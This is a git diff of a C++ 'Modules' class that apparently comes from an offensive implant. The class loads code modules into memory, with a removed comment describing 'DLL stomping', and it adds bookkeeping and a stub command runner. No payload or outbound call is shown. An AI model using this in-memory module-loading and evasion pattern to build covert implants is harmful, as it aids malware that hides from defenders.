@@ -1,15 +1,10 @@
 #include "modules/modules.h"
+#include "packager/packager.h"
+
 
 Modules* modules = NULL;
 
-/*
-	Path
-	->
-	LoadModule -> checks if IStompedDllLoaded == FALSE
-		if so -> calls LoadStompedDll
-			this calls GetStompedDllText() and saves text base + text size
-	
-*/
+
 
 
 BOOL Modules::IsModuleLoaded(INT32 bit) {
@@ -42,6 +37,11 @@ BOOL Modules::LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit) {
 	}
 
 	kratos->apis.NtFlushInstructionCache( GetCurrentProcess( ), ModuleBaseToWrite, PageSize );
+	this->UpdateBitField(ModuleBit);
+	ModuleInformation* info = this->FindFreeModInfo();
+	info->EntryPoint = ModuleBaseToWrite;
+	info->id = ModuleBit;
+	info->ModuleSizeInMemory = PageSize;
 
 	return TRUE;
 
@@ -49,7 +49,26 @@ BOOL Modules::LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit) {
 
 
 
+BOOL Modules::RunModuleCommand(INT32 ModuleBit) {
+	if (!this->IsModuleLoaded(ModuleBit)) {
+		packager->Pack4(ERROR_MODULE_LOADED);
+		return FALSE;
+	}
+
+	ModuleInformation* info = this->FindModInfoEntry(ModuleBit);
+
+
+
+	return TRUE;
+}
+
+
 
 INT64 Modules::GetLoadedModulesBitMap() {
 	return this->LoadModulesBitMap;
+}
+
+
+void Modules::UpdateBitField(INT32 Bit) {
+	this->LoadModulesBitMap ^= (1U << Bit);
 }
